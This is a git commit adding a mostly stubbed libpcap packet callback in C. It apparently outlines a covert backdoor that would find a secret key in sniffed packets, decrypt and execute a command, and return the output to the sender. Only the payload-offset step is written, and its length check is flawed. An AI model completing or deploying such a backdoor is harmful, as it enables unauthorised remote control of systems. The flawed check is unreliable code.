b5aeefa51e52ff94773b489c14adb4d65934dfe0
William Murphy <will.murphy1994@gmail.com>
2019-10-16 16:51:32 -0700

    Added basic packet capturing functionality

---
+++ packet_handler.c
@@ -0,0 +1,48 @@
+#include "packet_handler.h"
+
+
+/*
+* Callback function for examining captured packets.
+* 
+* Params:
+*   u_char* args: Pointer to user data.
+*   const struct pcap_pkthdr* header: Struct that contains information about the captured packet.
+*   const u_char* packet: Pointer to the captured packet in serialized form.
+*
+* Returns:
+*   None
+*
+*/
+void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet) 
+{
+
+    const char* COMMAND_START = "start[";
+    const char* COMMAND_END = "]end";
+
+    const int MAX_COMMAND_LEN = 1024;
+    const int ETHER_IP_UDP_LEN = 44;
+
+    char command[MAX_COMMAND_LEN];
+    int len;
+    int loop;
+    char* payload;
+
+    // Step 1: Locate the payload of the packet
+    payload = (char*)(packet + ETHER_IP_UDP_LEN);
+    if ((header->caplen - ETHER_IP_UDP_LEN - 14) <= 0) // Why 14?
+    {
+        return;
+    }
+    // Step 2: Check the payload for the secret key
+
+    // Step 3: Decrypt the payload
+
+    // Step 4: Verify decrypted payload has a command in it
+
+    // Step 5: Extract the command
+
+    // Step 6: Execute the command
+
+    // Step 7: Send the command's output to the sender of the command
+    return;
+}
